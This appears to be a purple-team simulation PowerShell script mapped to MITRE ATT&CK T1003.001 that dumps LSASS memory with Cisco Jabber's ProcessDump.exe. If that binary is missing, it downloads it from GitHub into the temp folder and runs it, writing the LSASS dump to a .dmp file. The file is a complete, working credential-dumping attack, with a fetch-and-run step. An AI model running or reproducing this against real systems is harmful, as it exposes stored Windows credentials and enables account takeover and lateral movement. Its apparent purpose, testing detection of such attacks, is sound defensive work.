<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    Dump lsass with ProcessDump.exe from cisco-jabber software
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

# Execute ProcessDump from cisco-jabber software
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/ProcessDump.exe"
$processdump = "${env:ProgramFiles(x86)}\Cisco Systems\Cisco Jabber\x64\ProcessDump.exe"
$dumpfile = "$env:tmp\ProcessDump_lsass_dump.dmp"
$lsass_pid = (ps lsass).id

try {
    if (Test-Path $processdump){
        Write-Host -ForegroundColor Green "Cisco jabber is installed with ProcessDump in $processdump"
        Write-Host -ForegroundColor Cyan "Executing $processdump ..."
        &"$processdump" $lsass_pid $dumpfile 
    }
    else{
        Write-Host -ForegroundColor Red "Error: ProcessDump not found in $outfile, cisco-jabber must be installed"
        Write-Host -ForegroundColor Cyan "Downloading ProcessDump.exe of cisco-jabber from Github repo..."
        Invoke-WebRequest -Uri $url -OutFile $env:tmp\pdump.exe
        if(Test-Path $env:tmp\pdump.exe){
            Write-Host -ForegroundColor Green "Success: ProcessDump downloaded: $env:tmp\pdump.exe"
            Write-Host -ForegroundColor Cyan "Executing $env:tmp\pdump.exe ..."
            &"$env:tmp\pdump.exe" $lsass_pid $dumpfile 
        }
        else{
            Write-Host -ForegroundColor Red "Error: Download failed, $env:tmp\pdump.exe not found"
        }
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Dumped lsass.exe memory to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to Dump lsass.exe memory to $dumpfile"
    }
}
catch {
    Write-Error $_
}

Stop-Transcript
